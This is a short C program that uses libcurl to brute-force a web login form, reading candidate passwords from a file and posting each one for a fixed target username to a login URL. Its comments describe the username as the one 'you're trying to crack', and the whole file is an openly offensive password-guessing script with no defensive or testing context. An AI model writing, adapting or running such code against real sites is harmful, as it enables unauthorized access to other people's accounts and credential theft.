#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#define URL "http://example.com/login.php"  // Change to your login URL
#define USERNAME "target_user"              // The username you're trying to crack
#define PASSWORD_LIST_FILE "passwords.txt"  // A list of possible passwords (one per line)

void attemptLogin(CURL *curl, const char *username, const char *password) {
    CURLcode res;
    char postdata[256];

    // Create POST data for login form
    snprintf(postdata, sizeof(postdata), "username=%s&password=%s", username, password);

    // Set up the curl options
    curl_easy_setopt(curl, CURLOPT_URL, URL);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postdata);
    
    // Perform the request
    res = curl_easy_perform(curl);
    
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    } else {
        printf("Tried password: %s\n", password);
        // Check for login success (you need to modify this depending on how the page responds)
        // For example, you could check for the presence of a specific string in the response.
    }
}

int main() {
    CURL *curl;
    FILE *password_file;
    char password[100];

    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (!curl) {
        fprintf(stderr, "Failed to initialize curl\n");
        return 1;
    }

    // Open the password list file
    password_file = fopen(PASSWORD_LIST_FILE, "r");
    if (!password_file) {
        perror("Failed to open password list");
        return 1;
    }

    // Read passwords from the list and attempt login
    while (fgets(password, sizeof(password), password_file)) {
        // Remove newline character from password
        password[strcspn(password, "\n")] = '\0';
        
        attemptLogin(curl, USERNAME, password);
    }

    // Clean up
    fclose(password_file);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    return 0;
}

